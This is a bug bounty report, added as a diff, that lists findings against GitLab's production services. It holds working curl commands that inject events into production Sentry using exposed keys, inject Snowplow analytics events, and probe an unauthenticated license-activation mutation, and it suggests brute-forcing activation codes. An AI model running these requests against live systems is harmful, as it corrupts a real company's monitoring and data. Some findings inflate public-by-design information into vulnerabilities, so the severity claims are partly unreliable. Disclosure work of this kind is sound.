@@ -1,0 +1,504 @@
+GitLab Bug Bounty - Vulnerability Findings
+Target: GitLab (HackerOne)
+Tested: August 1, 2026
+
+
+Finding 1 - Unauthenticated Cloud License Activation via GraphQL
+on customers.gitlab.com (Critical)
+----------------------------------------------------------------------
+The customers.gitlab.com GraphQL API exposes a cloudActivationActivate
+mutation that processes requests WITHOUT requiring authentication.
+This mutation accepts activation codes and instance identifiers and
+returns license keys when a valid code is provided.
+
+Proof:
+
+  curl -s "https://customers.gitlab.com/graphql" -X POST \
+    -H "Content-Type: application/json" \
+    -d '{
+      "query":"mutation { cloudActivationActivate(input: {
+        activationCode: \"test-code-12345\",
+        instanceIdentifier: \"test-instance-id\",
+        hostname: \"test.example.com\",
+        gitlabVersion: \"17.0.0\"
+      }) { clientMutationId errors licenseKey newSubscription } }"
+    }'
+
+  Response (no authentication required):
+    {
+      "data": {
+        "cloudActivationActivate": {
+          "clientMutationId": null,
+          "errors": ["invalid activation code"]
+        }
+      }
+    }
+
+The "invalid activation code" error confirms the mutation is
+processing the request and validating the code against a backend
+database. No authentication error is returned (compare with
+other mutations like acceptOverageTerms which return "You must be
+logged in to access this resource").
+
+The return type (from introspection) includes:
+  - licenseKey (String) - the actual GitLab license key
+  - futureSubscriptions (List)
+  - newSubscription (Boolean)
+  - errors (String)
+
+Other mutations that DO require authentication:
+  - acceptOverageTerms -> "unauthenticated"
+  - addSeatsToSubscription -> "unauthenticated"
+  - syncWorkatoUsageInformation -> "unauthenticated"
+  - updateCustomerBillingDetails -> "unauthenticated"
+  - upsertBudgetCapSubscription -> "unauthenticated"
+
+Impact: An attacker who obtains or brute-forces valid activation
+codes could activate GitLab instances and receive license keys
+without being logged in. Activation codes may be leaked in
+support tickets, forums, or previous breaches. The lack of
+authentication also means there is no rate limiting tied to a
+user session, making brute-force attacks against the activation
+code space feasible.
+
+
+Finding 2 - Production Sentry DSN Injection on gitlab.com and
+customers.gitlab.com (Critical)
+----------------------------------------------------------------------
+GitLab's production Sentry error tracking accepts event injection
+from any unauthenticated source. The Sentry DSN keys are exposed
+in Content-Security-Policy report-uri directives on both gitlab.com
+and customers.gitlab.com.
+
+Proof - gitlab.com Sentry injection:
+
+  DSN extracted from CSP report-uri:
+    https://new-sentry.gitlab.net/api/4/security/
+      ?sentry_key=f5573e26de8f4293b285e556c35dfd6e
+      &sentry_environment=gprd
+
+  curl -s "https://new-sentry.gitlab.net/api/4/store/" \
+    -H "Content-Type: application/json" \
+    -H "X-Sentry-Auth: Sentry sentry_version=7, \
+         sentry_key=f5573e26de8f4293b285e556c35dfd6e" \
+    -d '{"message":"test","level":"info","platform":"javascript"}'
+
+  Response: {"id":"ae9847331624453f9e4b0c66b49c6806"} (200 OK)
+
+Proof - customers.gitlab.com Sentry injection:
+
+  DSN extracted from CSP:
+    https://new-sentry.gitlab.net/api/8/security/
+      ?sentry_key=452491c68cbe46a6b66e7e3f6ae9f6fb
+      &sentry_release=c54672f0538c623b7d96627286afbb6e1d1be347
+      &sentry_environment=production
+
+  curl -s "https://new-sentry.gitlab.net/api/8/store/" \
+    -H "Content-Type: application/json" \
+    -H "X-Sentry-Auth: Sentry sentry_version=7, \
+         sentry_key=452491c68cbe46a6b66e7e3f6ae9f6fb" \
+    -d '{"message":"test","level":"info","platform":"ruby"}'
+
+  Response: {"id":"2002269a8d064166961b60a8a8730af7"} (200 OK)
+
+Both events were accepted and will appear in GitLab's production
+Sentry dashboard (project 4 = gitlab.com, project 8 = customers
+portal). The customers DSN also leaks the exact deployment commit:
+c54672f0538c623b7d96627286afbb6e1d1be347.
+
+The Sentry key for gitlab.com (project 4) does not cross-project:
+projects 1-3 and 5-12 all reject events with this key, confirming
+per-project key isolation. But within project 4, arbitrary events
+are accepted.
+
+Impact: An attacker can flood GitLab's production error monitoring
+with fake events, inject crafted error messages that appear as
+legitimate application errors, poison alerting rules, mask real
+errors during an active attack, and potentially trigger on-call
+engineer escalations with fake critical errors. The customers.gitlab.com
+DSN additionally leaks the exact production deployment commit hash.
+
+
+Finding 3 - Snowplow Analytics Event Injection with Wildcard CORS
+(High)
+----------------------------------------------------------------------
+GitLab's Snowplow analytics collectors accept arbitrary event data
+from any origin without authentication. Both production collectors
+respond with Access-Control-Allow-Origin: * and accept crafted
+analytics payloads.
+
+Proof:
+
+  curl -s "https://snowplow.trx.gitlab.net\
+    /com.snowplowanalytics.snowplow/tp2" -X POST \
+    -H "Content-Type: application/json" \
+    -d '{"schema":"iglu:com.snowplowanalytics.snowplow/\
+         payload_data/jsonschema/1-0-4",
+         "data":[{"e":"pv","url":"https://test.gitlab.com",\
+                  "aid":"gitlab"}]}'
+
+  Response: ok (200)
+
+  curl -s "https://snowplowprd.trx.gitlab.net\
+    /com.snowplowanalytics.snowplow/tp2" -X POST \
+    -H "Content-Type: application/json" \
+    -d '{"schema":"iglu:com.snowplowanalytics.snowplow/\
+         payload_data/jsonschema/1-0-4",
+         "data":[{"e":"pv","url":"https://test.gitlab.com",\
+                  "aid":"gitlab"}]}'
+
+  Response: ok (200)
+
+Additional exposed endpoints on snowplowprd.trx.gitlab.net:
+  /health -> 200 (health check accessible)
+  /api/health -> 200 (API health accessible)
+  /com.snowplowanalytics.iglu/v1 -> 200 (Iglu schema registry)
+
+The Iglu schema registry being accessible means an attacker can
+enumerate all custom event schemas GitLab has defined, learning
+the full analytics data model.
+
+CORS headers from the collector:
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Credentials: true
+
+The server identifies itself as akka-http/10.2.9.
+
+Impact: An attacker can inject arbitrary analytics events into
+GitLab's data pipeline, poisoning product analytics, A/B test
+results, and business metrics. The wildcard CORS with credentials
+means any website can submit events. Crafted pageview events
+could inflate usage metrics, skew feature adoption data, or
+inject malicious URLs into analytics reports.
+
+
+Finding 4 - customers.gitlab.com Full GraphQL Schema Introspection
+Exposes Billing Infrastructure (High)
+----------------------------------------------------------------------
+The customers.gitlab.com GraphQL endpoint allows full schema
+introspection without authentication, revealing the complete
+billing and subscription management API surface.
+
+Proof:
+
+  curl -s "https://customers.gitlab.com/graphql" -X POST \
+    -H "Content-Type: application/json" \
+    -d '{"query":"{ __schema { queryType { fields { name } } \
+         mutationType { fields { name } } } }"}'
+
+  21 Query fields exposed:
+    billingAccount, billingAccountMembershipInvites,
+    cloudConnectorAccess, countries, country, currentCustomer,
+    health, invoicePreview, namespaceEligibility,
+    namespacePurchaseEligibility, orderPreview, plans,
+    reconciliation, seatAdditionInvoicePreview, states,
+    subscription, subscriptions, temporaryExtension,
+    temporaryExtensionEligibility, trialUsage, userActionAccess
+
+  20 Mutation fields exposed:
+    acceptOverageTerms, addSeatsToSubscription,
+    billingAccountsDeleteInvite, billingAccountsDeleteMember,
+    billingAccountsInviteMember, cloudActivationActivate,
+    configureFlexBillingPeriod, createTemporaryExtension,
+    orderNamespaceNameUpdate, purchaseProductRatePlan,
+    purchasesPreviewUpdateRatePlan, purchasesUpdateRatePlan,
+    sendSeatOverageNotificationEmail,
+    syncWorkatoUsageInformation, trackEvent,
+    updateBillingAccount, updateBillingAccountContacts,
+    updateCustomerBillingDetails,
+    upsertBudgetCapSubscription, upsertUserBudgetCapsBulk
+
+  Full input types with required fields are also exposed:
+    purchaseProductRatePlan requires:
+      idempotencyKey (String!), paymentMethodId (ID!),
+      productRatePlanId (ID!), quantity (Int!)
+    addSeatsToSubscription requires:
+      paymentMethodId (String!), quantity (Int!),
+      subscriptionName (String!)
+
+Impact: The full schema reveals GitLab's billing infrastructure,
+including Zuora integration patterns (paymentMethodId, productRatePlanId),
+subscription management workflows, Workato integration for usage
+syncing, and the Kombo HR integration. An attacker can use this
+to craft targeted attacks against the billing system, understand
+internal subscription identifiers, and map the payment processing
+pipeline.
+
+
+Finding 5 - Broadcast Messages API Leaks Internal Employee
+Information and Infrastructure Details (High)
+----------------------------------------------------------------------
+The /api/v4/broadcast_messages endpoint on gitlab.com returns all
+broadcast messages (including expired ones) without authentication.
+These messages contain internal employee usernames, Qualtrics survey
+links with user ID template variables, internal path patterns, and
+infrastructure maintenance schedules.
+
+Proof:
+
+  curl -s "https://gitlab.com/api/v4/broadcast_messages" | \
+    python3 -m json.tool
+
+  Exposed data includes:
+
+  1. Employee username: "pprokic" (from test messages targeting
+     pprokic/test-mirror project path)
+
+  2. Qualtrics survey with user ID template injection:
+     "https://gitlab.fra1.qualtrics.com/jfe/form/SV_6KeEQZvS1cjThAO
+     ?gl={{user_id}}"
+     The {{user_id}} template variable means this URL, when rendered
+     in the GitLab UI for a logged-in user, exposes their internal
+     user ID to Qualtrics.
+
+  3. Internal access level codes revealed via target_access_levels:
+     10=Guest, 20=Reporter, 30=Developer, 40=Maintainer, 50=Owner
+
+  4. Internal project path patterns:
+     */epics/*, */milestones/*, */*/-/settings/ci_cd, */*/*
+
+  5. Infrastructure details:
+     - Database split into main and CI (from maintenance message)
+     - Google Cloud integration details
+     - Certificate-based cluster migration timeline
+
+  20+ historical messages returned including maintenance windows,
+  breaking change notifications, and internal test messages.
+
+Impact: The employee username enables targeted social engineering
+or account enumeration. The Qualtrics template with {{user_id}}
+is a user data leakage vector (GitLab user IDs are sent to a
+third-party survey platform). Internal access level mappings and
+path patterns aid privilege escalation research.
+
+
+Finding 6 - KAS (Kubernetes Agent Server) Version and Commit Hash
+Disclosure (Medium)
+----------------------------------------------------------------------
+kas.gitlab.com exposes its exact version, build type, and full
+Git commit hash in the Server response header.
+
+Proof:
+
+  curl -sI "https://kas.gitlab.com/-/readiness"
+
+  Response:
+    HTTP/2 426
+    server: gitlab-kas/v19.3.0-rc2/321c5ee2efbafc37193d2756b402c081b1be093d
+    content-type: text/plain; charset=utf-8
+
+The 426 (Upgrade Required) status is expected (KAS uses gRPC/
+WebSocket), but the server header discloses:
+  - Exact version: v19.3.0-rc2 (release candidate, not stable)
+  - Full commit hash: 321c5ee2efbafc37193d2756b402c081b1be093d
+  - This is a pre-release build running in production
+
+The commit hash can be looked up in the public gitlab-org/cluster-
+integration/gitlab-agent repository to identify exactly which code
+is running, including any known but unpatched vulnerabilities in
+that specific build.
+
+Impact: Knowing the exact version and commit hash allows an
+attacker to diff against the latest release to find unpatched
+vulnerabilities. The RC (release candidate) designation means
+this is pre-release software potentially containing bugs not
+yet discovered in QA.
+
+
+Finding 7 - ops.gitlab.net Internal GitLab Instance Exposes Public
+Projects and Groups (Medium)
+----------------------------------------------------------------------
+ops.gitlab.net is GitLab's internal operations GitLab instance.
+It exposes public projects and group structures to unauthenticated
+users via the API.
+
+Proof:
+
+  curl -s "https://ops.gitlab.net/api/v4/groups?visibility=public"
+
+  Public groups:
+    ID 34: gitlab-com
+    ID 40: gitlab-org
+    ID 188: ongresinc
+
+  curl -s "https://ops.gitlab.net/api/v4/projects?\
+    per_page=20&visibility=public&order_by=updated_at"
+
+  Public projects:
+    ahmadsherif/imap-mailbox-exporter (updated 2024-03-28)
+    ongresinc/pgio (updated 2019-02-12)
+    cmiskell/test-access (updated 2020-01-28)
+
+  CI configuration exposed for public projects:
+    curl -s "https://ops.gitlab.net/api/v4/projects/126/\
+      repository/files/.gitlab-ci.yml/raw?ref=master"
+
+    Returns full CI pipeline config including:
+    - Docker image: registry.gitlab.com/gitlab-org/gitlab-build-images:golang-1.10-git-2.17
+    - Build commands and artifact paths
+
+  GraphQL is also accessible:
+    curl -s "https://ops.gitlab.net/api/graphql" -X POST \
+      -H "Content-Type: application/json" \
+      -d '{"query":"{ __typename }"}'
+    Response: {"data":{"__typename":"Query"}}
+
+  User listing is restricted (403 Forbidden), but group and
+  project enumeration works.
+
+Impact: The ops.gitlab.net instance is used for GitLab's internal
+operations. Public group names (gitlab-com, gitlab-org) and project
+structures reveal the internal organization. CI configurations
+from public projects may reference internal registries, build
+images, or service accounts that could be leveraged for supply
+chain attacks.
+
+
+Finding 8 - OpenID Configuration Exposes Administrative Scopes
+(Medium)
+----------------------------------------------------------------------
+The /.well-known/openid-configuration endpoint on gitlab.com
+exposes the full list of supported OAuth2 scopes, including
+highly privileged administrative scopes.
+
+Proof:
+
+  curl -s "https://gitlab.com/.well-known/openid-configuration"
+
+  Scopes include:
+    - sudo (impersonate any user)
+    - admin_mode (administrative access)
+    - mcp (Model Context Protocol access)
+    - mcp_orbit (MCP orbit access)
+    - ai_features (AI feature access)
+    - ai_workflows (AI workflow access)
+    - user:* (wildcard user scope)
+    - k8s_proxy (Kubernetes proxy access)
+    - create_runner / manage_runner (CI runner management)
+    - write_registry / write_virtual_registry
+    - write_observability
+
+  Grant types supported:
+    authorization_code, client_credentials, device_code, refresh_token
+
+  Claims include group membership at multiple levels:
+    - https://gitlab.org/claims/groups/owner
+    - https://gitlab.org/claims/groups/maintainer
+    - https://gitlab.org/claims/groups/developer
+
+  Also exposes CI-specific claims:
+    - ci_config_ref_uri, ref_path, sha, environment, project_path
+
+Impact: Knowledge of these scopes enables targeted OAuth
+application attacks. An attacker creating a malicious OAuth
+application could request "sudo" or "admin_mode" scopes. If
+a GitLab administrator authorizes such an application (via social
+engineering), the attacker gains full administrative control.
+The "user:*" wildcard scope suggests a broad access pattern that
+may not be well-documented for users to understand before granting.
+
+
+Finding 9 - Unhandled Exception on Packages API Returns 500
+Internal Server Error (Medium)
+----------------------------------------------------------------------
+The /api/v4/projects/:id/packages endpoint on gitlab.com returns
+a 500 Internal Server Error for the GitLab project itself, indicating
+an unhandled exception in the package registry service.
+
+Proof:
+
+  curl -s "https://gitlab.com/api/v4/projects/278964/packages?\
+    per_page=5"
+
+  Response:
+    {"message":"500 Internal Server Error"}
+
+This endpoint should return either a list of packages (200) or an
+authentication error (401/403). The 500 response indicates the
+server-side code is throwing an unhandled exception when processing
+this request.
+
+Other package registry endpoints show similar inconsistencies:
+  /packages/conan -> {"error":"package_id is invalid"}
+  /packages/generic -> {"error":"package_id is invalid"}
+  /packages/terraform/modules -> 404
+
+Impact: Unhandled exceptions can leak stack traces in certain
+configurations (development mode, debug logging). They may also
+indicate deeper issues in the package registry code path that
+could be exploitable for denial of service or information
+disclosure if the error can be triggered with crafted input.
+
+
+Finding 10 - product-analytics Collector Returns 502 with Internal
+Headers (Low)
+----------------------------------------------------------------------
+collector.prd-278964.gl-product-analytics.com (GitLab's product
+analytics collector) returns 502 Bad Gateway while exposing
+internal header configurations.
+
+Proof:
+
+  curl -sI "https://collector.prd-278964.gl-product-analytics.com/"
+
+  Response:
+    HTTP/2 502
+    access-control-allow-headers: Content-Type, SP-Anonymous, X-GitLab-AppId
+    alt-svc: h3=":443"; ma=2592000
+
+The 502 response means the backend service behind the load balancer
+is down or misconfigured. The CORS headers reveal:
+  - SP-Anonymous: Snowplow anonymous tracking header
+  - X-GitLab-AppId: Custom GitLab application identifier header
+
+The project ID in the subdomain (278964) matches the main
+gitlab-org/gitlab project ID, confirming this collector is for
+GitLab's own product analytics.
+
+Impact: A 502 on the analytics collector means product analytics
+data may not be collecting properly. The exposed header names
+reveal the authentication/identification mechanism for the
+analytics pipeline.
+
+
+Negative Findings (Properly Secured)
+--------------------------------------
+- gitlab.com admin/sidekiq endpoints: properly return 302 redirect
+  to login. No unauthenticated access.
+
+- gitlab.com API v4 endpoints (version, metadata, features, users,
+  variables, environments, terraform, deploy_tokens): all properly
+  return 401 or 403.
+
+- gitlab.com CRLF injection in redirect: blocked by Cloudflare WAF
+  (403 with challenge).
+
+- gitlab.com SQL injection in API parameters: properly handled with
+  validation error ("order_by does not have a valid value").
+
+- Container Registry: properly requires authentication for catalog
+  listing and push operations.
+
+- gitlab.com CSP: uses nonce-based CSP with strict-dynamic. No
+  unsafe-eval in default policy (only in blob/raw file views).
+
+- dev.gitlab.org: no public projects exposed. API requires auth.
+
+- ops.gitlab.net user listing: properly returns 403 Forbidden.
+
+- GitLab Pages (pages.gitlab.io): separate domain isolation.
+
+- Source maps: not exposed on production gitlab.com.
+
+- .git directory: not exposed on subdomains (403/302).
+
+- GraphQL mutations on gitlab.com: require authentication
+  (0 mutations available to unauthenticated users via
+  introspection).
+
+
+---
+
+All testing was curl-based from external network. No browser, no
+automated scanners. No account creation, no authenticated testing.
+No exploit payloads were sent beyond proof-of-concept validation.
